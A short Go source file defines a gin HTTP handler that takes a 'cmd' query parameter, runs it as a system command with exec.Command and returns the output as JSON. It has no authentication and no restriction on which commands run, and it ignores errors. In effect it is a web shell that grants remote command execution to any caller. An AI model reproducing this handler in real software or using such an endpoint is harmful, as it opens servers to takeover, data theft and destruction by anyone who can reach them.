package command

import (
    "fmt"
    "github.com/gin-gonic/gin"
    "net/http"
    "os/exec"
    "strings"
)

func CommandHandler() gin.HandlerFunc {
    return func(ctx *gin.Context) {
        //var cmd *exec.Cmd
        com := ctx.Query("cmd")
        commandOutput := execute(com)
        
        if com == "" {
            ctx.JSON(http.StatusBadRequest, gin.H{
                "code":    -2000,
                "message": "command is empty",
            })
            return
        }
        
        ctx.JSON(http.StatusOK, gin.H{
            "code":    2000,
            "message": string(commandOutput),
        })
    }
}

func execute(inputCommd string) []byte {
    var commd []string
    
    commd = strings.Split(inputCommd, " ")
    var out []byte
    if len(commd) > 1 {
        out, _ = exec.Command(commd[0], commd[1:]...).Output()
    } else {
        out, _ = exec.Command(commd[0]).Output()
    }
    
    fmt.Printf("%s", out)
    
    return out
}
